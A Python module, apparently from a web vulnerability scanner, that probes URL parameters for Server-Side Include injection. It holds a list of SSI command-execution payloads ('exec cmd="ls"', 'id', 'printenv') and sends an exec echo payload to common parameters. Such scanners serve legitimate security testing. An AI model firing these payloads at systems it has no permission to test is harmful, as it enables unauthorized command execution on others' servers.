import asyncio
from modules.core import console

# SSI Payloads
SSI_PAYLOADS = [
    '<!--#exec cmd="ls"-->',
    '<!--#echo var="DATE_LOCAL"-->',
    '<!--#printenv -->',
    '<!--#exec cmd="id"-->'
]

async def check_ssi(session, url, param):
    try:
        # Fuzz standard execution payload
        payload = '<!--#exec cmd="echo SSIBITE"-->'
        target = f"{url}?{param}={payload}"
        if "?" in url: target = f"{url}&{param}={payload}"
        
        async with session.get(target, timeout=5, ssl=False) as resp:
            text = await resp.text()
            
            # Check for reflection of execution result
            if "SSIBITE" in text and "<!--" not in text: 
                # If "SSIBITE" is there but the comment tags are GONE, it likely executed (or stripped).
                # A better check is the echo output itself.
                return {
                    "url": target,
                    "param": param,
                    "type": "SSI Injection (RCE)",
                    "payload": payload
                }
            
            # Check for generic SSI error messages
            if "[an error occurred while processing this directive]" in text:
                 return {
                    "url": target,
                    "param": param,
                    "type": "SSI Injection (Error Based)",
                    "payload": payload
                }

    except Exception:
        pass
    return None

async def scan_ssi(session, url):
    """
    Scan for Server-Side Include (SSI) Injection.
    """
    console.print(f"\n[bold cyan]--- SSI Injection Scanner ---[/bold cyan]")
    
    # We need parameters to inject into.
    # For now, we'll assume a generic set or rely on future parameter extraction improvements.
    # We will test a few common params if none provided (simulated here)
    params = ["q", "id", "search", "file", "view", "page", "include"]
    
    tasks = [check_ssi(session, url, p) for p in params]
    results = await asyncio.gather(*tasks)
    
    found = []
    for res in results:
        if res:
             console.print(f"  [bold red][!] SSI INJECTION CONFIRMED: {res['param']}[/bold red]")
             console.print(f"      URL: {res['url']}")
             found.append(res)
             
    if not found:
        console.print("[dim][-] No SSI injection vulnerabilities detected.[/dim]")
        
    return found
